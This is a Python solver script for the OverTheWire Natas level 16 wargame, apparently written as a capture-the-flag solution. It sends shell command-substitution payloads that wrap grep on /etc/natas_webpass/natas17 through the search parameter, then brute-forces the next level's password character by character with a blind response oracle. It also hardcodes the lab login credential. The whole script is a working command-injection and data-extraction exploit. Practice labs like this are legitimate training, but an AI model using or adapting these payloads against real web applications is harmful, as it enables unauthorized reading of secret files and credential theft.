import requests
import sys
import time

from string import ascii_letters, digits
from itertools import chain

CHAL_URL  = 'http://natas16.natas.labs.overthewire.org/'
CHAL_USER = 'natas16'
NEXT_USER = 'natas17'
CHAL_PASSWORD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

GREP_CHARSET = '$(grep -E +%s+ /etc/natas_webpass/natas17)hackers'
GREP_PASSWORD = '$(grep -E ^%s%s.* /etc/natas_webpass/natas17)hackers'

PASSWORD_LEN = 32

if __name__ == '__main__':

    creds = requests.auth.HTTPBasicAuth(CHAL_USER, CHAL_PASSWORD)
    charset = []
    password = ''

    print('[*] Constructing charset.')
    for c in chain(ascii_letters, digits):

        response = requests.get(CHAL_URL,
            auth=creds,
            params={ 'needle' : GREP_CHARSET % c},
        )
        if 'hackers' not in response.text:
            print('[$] Adding %s to charset.' % c)
            charset.append(c)

    print('[*] Using charset')
    print('     |')
    print('     ---> %s' % ' '.join(charset))

    print()
    print('[*] Bruteforcing %s password.' % NEXT_USER)
    for i in range(0, PASSWORD_LEN):

        for c in charset:

            response = requests.get(CHAL_URL,
                auth=creds,
                params={ 'needle' : GREP_PASSWORD % (password, c)},
            )
            if 'hackers' not in response.text:
                password = '%s%s' % (password, c)
                print('[*] Constructing password: %s' % password)
                break

    print()
    print('[$] Login for next level %s:%s' % (NEXT_USER, password))
